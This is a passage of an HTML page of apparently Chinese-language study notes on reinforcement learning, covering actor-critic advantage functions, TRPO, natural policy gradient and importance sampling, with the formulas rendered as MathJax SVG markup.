44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g></g><g data-mml-node="mo" transform="translate(3994.1, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4383.1, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(4852.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5296.8, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5825.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><ul>
<li>AC PG<ul>
<li>Advantage function (baseline <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.74ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 769 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container>)<ul>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="27.088ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 11972.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, 363) scale(0.707)"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g><g data-mml-node="mo" transform="translate(1203.1, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1592.1, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2061.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2505.7, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(3034.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3701.5, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(4757.3, 0)"><g data-mml-node="mi"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mi" transform="translate(791, 363) scale(0.707)"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g><g data-mml-node="mo" transform="translate(6001.3, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6390.3, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(6859.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(7304, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(7833, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8444.2, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(9444.4, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 363) scale(0.707)"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g><g data-mml-node="mo" transform="translate(10725.8, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(11114.8, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(11583.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
</ul>
</li>
<li>MC采样解决不可微分的问题</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>SOTA RL</p>
<ul>
<li>PG <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> TRPO(2015) <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> ACKTR(2017) <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> PPO(2017)</li>
<li>Q-learning <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> DDPG(2014) <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> TD3(2018) <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> SAC(2018)</li>
</ul>
</li>
</ul>
<h1 id="策略优化进阶"><a href="#策略优化进阶" class="headerlink" title="策略优化进阶"></a>策略优化进阶</h1><ul>
<li>PG<ul>
<li>改进思路<ul>
<li>训练更稳定<ul>
<li>Trust Region<ul>
<li>KL限制<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.355ex" xmlns="http://www.w3.org/2000/svg" width="2.153ex" height="1.33ex" role="img" focusable="false" viewBox="0 -431 951.6 588.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mi" transform="translate(570, -150) scale(0.707)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.592ex" xmlns="http://www.w3.org/2000/svg" width="3.707ex" height="1.567ex" role="img" focusable="false" viewBox="0 -431 1638.5 692.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="TeXAtom" transform="translate(570, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g><g data-mml-node="TeXAtom" transform="translate(469, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(485, 0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(783, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></g></g></g></g></svg></mjx-container>差异</li>
<li>限定区域（球体）并逐渐缩小</li>
</ul>
</li>
<li>Natural PG<ul>
<li>参数空间<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container>分布空间（policy输出）</li>
<li>KL散度（策略更新前后差异较小）</li>
<li>Fisher information matrix (FIM)</li>
<li>二阶优化（比SGD更准确）</li>
<li>策略优化和策略函数的参数化形式独立</li>
</ul>
</li>
</ul>
</li>
<li>提高sample效率 on-policy<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container>off-policy <ul>
<li>TRPO中的重要性采样IS<ul>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.592ex" xmlns="http://www.w3.org/2000/svg" width="6.991ex" height="2.289ex" role="img" focusable="false" viewBox="0 -750 3090.1 1011.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mi" transform="translate(570, -150) scale(0.707)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(951.6, 0)"><g data-mml-node="mo"><path 